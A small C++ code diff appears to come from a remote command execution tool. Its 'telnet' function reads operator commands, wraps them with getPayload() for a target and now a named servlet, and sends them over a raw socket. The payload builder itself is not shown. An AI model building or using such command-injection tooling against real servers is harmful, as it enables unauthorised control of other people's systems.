@@ -1,6 +1,6 @@
 #include "hdr.h"
 
-void telnet(addrinfo* addr, string target) {
+void telnet(addrinfo* addr, string target, string servlet) {
     char buf[100];
     char cmd[100];
     DWORD bytes;
@@ -12,7 +12,7 @@ void telnet(addrinfo* addr, string target) {
         cin.getline(cmd, 100);
         cout << endl;
 
-        string payload = getPayload(target, cmd);
+        string payload = getPayload(target, servlet, cmd);
         SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
         connect(sock, addr->ai_addr, addr->ai_addrlen);
         send(sock, payload.c_str(), payload.length(), NULL);
